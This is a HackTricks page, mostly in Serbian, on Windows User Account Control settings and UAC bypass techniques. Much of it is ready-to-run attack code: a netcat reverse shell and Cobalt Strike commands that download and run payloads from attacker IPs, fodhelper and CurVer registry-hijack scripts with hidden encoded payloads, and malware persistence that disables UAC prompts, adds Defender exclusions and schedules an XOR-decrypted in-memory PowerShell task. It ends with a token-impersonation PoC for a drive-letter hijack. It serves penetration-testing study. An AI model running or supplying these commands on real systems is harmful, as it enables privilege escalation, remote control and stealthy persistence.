# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **upit za odobrenje za aktivnosti sa povišenim privilegijama**. Aplikacije imaju različite `integrity` nivoe, i program sa **visokim nivoom** može izvršavati zadatke koji **mogu potencijalno ugroziti sistem**. Kada je UAC omogućen, aplikacije i zadaci se uvek **pokreću u sigurnosnom kontekstu naloga bez administratorskih prava** osim ako administrator eksplicitno ne odobri tim aplikacijama/zadatcima da se pokreću sa administratorskim pristupom sistemu. To je funkcija radi pogodnosti koja štiti administratore od nenamernih promena, ali se ne smatra bezbednosnom granicom.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC uključen, administratorskom korisniku se dodeljuju 2 tokena: token standardnog korisnika za obavljanje uobičajenih radnji na regularnom nivou, i token sa administratorskim privilegijama.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administratori mogu koristiti bezbednosne politike da konfigurišu kako UAC radi specifično za njihovu organizaciju na lokalnom nivou (koristeći secpol.msc), ili da budu konfigurisane i distribuirane putem Group Policy Objects (GPO) u Active Directory domain environment. Različita podešavanja su detaljno objašnjena [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Postoji 10 Group Policy podešavanja koja se mogu namestiti za UAC. Sledeća tabela daje dodatne detalje:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Onemogućeno)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zahtevaj pristanak za binarne fajlove koji nisu Windows na sigurnom desktopu) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Zatraži kredencijale na sigurnom desktopu)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Omogućeno; podrazumevano onemogućeno na Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Onemogućeno)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Omogućeno)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Omogućeno)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Onemogućeno)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Omogućeno)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Omogućeno)                                              |

### Policies for installing software on Windows

Lokalne **security policies** (secpol.msc na većini sistema) su po podrazumevanim podešavanjima konfigurisane da **spreče ne-admin korisnike da instaliraju softver**. To znači da čak i ako ne-admin korisnik uspe da preuzme installer za vaš softver, neće moći da ga pokrene bez administratorskog naloga.

### Registry Keys to Force UAC to Ask for Elevation

Kao standardni korisnik bez administratorskih prava, možete osigurati da će "standard" nalog biti **zatražen za kredencijale od strane UAC-a** kada pokuša da izvrši određene radnje. Ova akcija bi zahtevala modifikaciju određenih **registry keys**, za koje su potrebna administratorska prava, osim ako postoji **UAC bypass**, ili napadač već nije prijavljen kao admin.

Čak i ako je korisnik u grupi **Administrators**, ove promene primoravaju korisnika da **ponovo unese svoje naloge kredencijale** kako bi izvršio administratorske radnje.

**Jedini nedostatak je što ovaj pristup zahteva onemogućavanje UAC-a da bi radio, što je malo verovatno u produkcionim okruženjima.**

Registrovski ključevi i unosi koje morate promeniti su sledeći (sa njihovim podrazumevanim vrednostima u zagradama):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Ovo se takođe može uraditi ručno putem Local Security Policy alata. Nakon izmene, administrativne operacije će tražiti od korisnika da ponovo unese svoje kredencijale.

### Napomena

**User Account Control is not a security boundary.** Dakle, standardni korisnici ne mogu izaći iz svojih naloga i dobiti administratorska prava bez local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC privilegije

- Internet Explorer Protected Mode koristi provere integriteta da spreči procese visokog integriteta (kao što su web browsers) da pristupe podacima niskog integriteta (npr. fascikli sa privremenim Internet fajlovima). Ovo se postiže pokretanjem browsera sa low-integrity tokenom. Kada browser pokuša da pristupi podacima smeštenim u zoni niskog integriteta, operativni sistem proverava integritet procesa i omogućava pristup u skladu sa tim. Ova funkcija pomaže da se spreče remote code execution napadi da dobiju pristup osetljivim podacima na sistemu.
- Kada se korisnik prijavi na Windows, sistem kreira access token koji sadrži listu korisničkih privilegija. Privilegije su definisane kao kombinacija korisničkih prava i sposobnosti. Token takođe sadrži listu korisničkih credentials, koji se koriste za autentifikaciju korisnika na računaru i prema resursima na mreži.

### Autoadminlogon

Da biste konfigurirali Windows da automatski prijavi određenog korisnika pri pokretanju, podesite **`AutoAdminLogon` registry key**. Ovo je korisno za kiosk okruženja ili za testiranje. Koristite ovo samo na sigurnim sistemima, jer izlaže password u registry-ju.

Podesite sledeće ključeve koristeći Registry Editor ili `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Da biste vratili normalno ponašanje prijave, podesite `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Imajte na umu da ako imate grafički pristup žrtvi, UAC bypass je jednostavan jer možete jednostavno kliknuti na "Yes" kada se pojavi UAC prompt

UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces radi u kontekstu srednjeg integriteta, i vaš korisnik pripada administratorskoj grupi**.

Važno je napomenuti da je **mnogo teže zaobići UAC ako je postavljen na najviši nivo bezbednosti (Always) nego kada je na nekom od drugih nivoa (Default).**

### UAC onemogućen

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**) možete izvršiti reverse shell sa admin privilegijama (high integrity level) koristeći nešto poput:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/
- https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html

### **Veoma** osnovni UAC "bypass" (potpun pristup fajl sistemu)

Ako imate shell sa korisnikom koji je član Administrators grupe, možete **montirati deljeni C$ preko SMB** lokalno kao novi disk i imaćete **pristup svemu unutar fajl sistema** (čak i Administrator-ovom home folderu).

> [!WARNING]
> **Izgleda da ovaj trik više ne radi**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike tehnike će raditi samo ako UAC nije podešen na maksimalni nivo bezbednosti.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC**.

### KRBUACBypass

Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) koja je **kompilacija** nekoliko UAC bypass exploits. Imajte na umu da ćete morati **kompajlirati UACME koristeći visual studio ili msbuild**. Kompilacija će kreirati nekoliko izvršnih fajlova (kao `Source\Akagi\outout\x64\Debug\Akagi.exe`) , moraćete da znate **koji vam je potreban.**\
Treba da **budete oprezni** jer će neki bypasses **pokrenuti neke druge programe** koji će **obavestiti** **korisnika** da se nešto dešava.

UACME ima **build verziju od koje je svaka tehnika počela da radi**. Možete pretražiti tehniku koja utiče na vaše verzije:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Pouzdani binarni fajl `fodhelper.exe` se automatski podiže na modernim Windows sistemima. Kada se pokrene, on čita donju korisničku putanju registra bez verifikacije `DelegateExecute` verba. Postavljanje komande tamo omogućava procesu Medium Integrity (user is in Administrators) da pokrene proces High Integrity bez UAC prompta.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell koraci (podesite svoj payload, zatim pokrenite)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Napomene:
- Radi kada je trenutni korisnik član grupe Administrators i kada je UAC nivo podrazumevan/olakšan (nije Always Notify sa dodatnim ograničenjima).
- Koristite putanju `sysnative` da pokrenete 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windowsu.
- Payload može biti bilo koja komanda (PowerShell, cmd, ili putanja do EXE). Izbegavajte UI-e koji prikazuju promptove radi prikrivanja.

#### CurVer/extension hijack variant (HKCU only)

Nedavni uzorci koji zloupotrebljavaju `fodhelper.exe` izbegavaju `DelegateExecute` i umesto toga **preusmeravaju `ms-settings` ProgID** putem vrednosti `CurVer` po korisniku. Auto-elevirani binarni fajl i dalje rešava handler pod `HKCU`, tako da nije potreban admin token da bi se postavile ključevi:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Kada dobije povišene privilegije, malver obično onemogućava buduće promptove tako što postavi `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, zatim izvodi dodatne tehnike izbegavanja odbrane (npr. `Add-MpPreference -ExclusionPath C:\ProgramData`) i ponovo kreira persistence da bi se pokretao kao high integrity. Tipičan persistence task čuva XOR-encrypted PowerShell script na disku i dekodira/izvršava ga u memoriji svakog sata:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ova varijanta i dalje čisti dropper i ostavlja samo staged payloads, pa otkrivanje zavisi od praćenja **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` manipulacija, kreiranja izuzetaka u Defenderu, ili zakazanih zadataka koji u memoriji dekriptuju PowerShell.

#### More UAC bypass

**Sve** tehnike korišćene ovde da se zaobiđe AUC **zahtevaju** **potpun interaktivni shell** sa žrtvom (obični nc.exe shell nije dovoljan).

Možete to dobiti koristeći **meterpreter** sesiju. Migrirajte u **proces** koji ima vrednost **Session** jednaku **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC Bypass with GUI

Ako imate pristup **GUI**-ju možete jednostavno prihvatiti UAC prompt kada se pojavi — zaista vam ne treba bypass. Dakle, dobijanje pristupa GUI-ju će vam omogućiti da zaobiđete UAC.

Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP), postoje **neki alati koji će se pokretati kao administrator** odakle biste, na primer, mogli **pokrenuti** **cmd** **kao admin** direktno bez ponovnog UAC prompta, kao [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo **diskretnije**.

### Noisy brute-force UAC bypass

Ako vam ne smeta da budete bučni, uvek možete **pokrenuti nešto poput** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) što **traži elevaciju privilegija dok korisnik ne prihvati**.

### Your own bypass - Basic UAC bypass methodology

Ako pogledate **UACME** primetićete da **većina UAC bypass-ova zloupotrebljava Dll Hijacking ranjivost** (uglavnom upisivanjem malicioznog dll u _C:\Windows\System32_). [Pročitajte ovo da naučite kako pronaći Dll Hijacking ranjivost](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binar koji će **autoelevate** (proverite da pri izvršenju radi u visokom nivou integriteta).
2. Sa procmon-om pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **upisete** DLL unutar nekih **zaštićenih putanja** (kao C:\Windows\System32) gde nemate dozvole za pisanje. Ovo možete zaobići koristeći:
   1. **wusa.exe**: Windows 7,8 and 8.1. Omogućava izdvajanje sadržaja CAB fajla u zaštićene putanje (jer se ovaj alat izvršava u visokom nivou integriteta).
   2. **IFileOperation**: Windows 10.
4. Pripremite **skriptu** da kopirate svoj DLL u zaštićenu putanju i izvršite ranjivi i autoelevated binar.

### Another UAC bypass technique

Sastoji se u praćenju da li neki **autoElevated binary** pokušava da **pročita** iz **registry** ime/putanju nekog **binary** ili **command** koji će biti **izvršen** (ovo je zanimljivije ako binar traži ovu informaciju u **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” koristi shadow-admin tokene sa per-session `\Sessions\0\DosDevices/<LUID>` mapama. Direktorijum se kreira lenjo od strane `SeGetTokenDeviceMap` pri prvom `\??` rezoluciji. Ako napadač imitira shadow-admin token samo na **SecurityIdentification**, direktorijum se kreira sa napadačem kao **owner** (nasleđuje `CREATOR OWNER`), što omogućava drive-letter linkove koji imaju prednost nad `\GLOBAL??`.

**Koraci:**

1. Iz sesije sa niskim privilegijama pozovite `RAiProcessRunOnce` da pokrenete promptless shadow-admin `runonce.exe`.
2. Duplirajte njegov primarni token u **identification** token i imitujte ga dok otvarate `\??` kako biste forsirali kreiranje `\Sessions\0\DosDevices/<LUID>` pod vlasništvom napadača.
3. Napravite tamo `C:` symlink koji pokazuje na skladište pod kontrolom napadača; naredni pristupi fajl sistemu u toj sesiji će rešavati `C:` na putanju napadača, što omogućava DLL/file hijack bez prompta.

PowerShell PoC (NtObjectManager):
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Izvori
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – Kako User Account Control funkcioniše](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – Kolekcija UAC bypass tehnika](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI koristi AI za generisanje PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
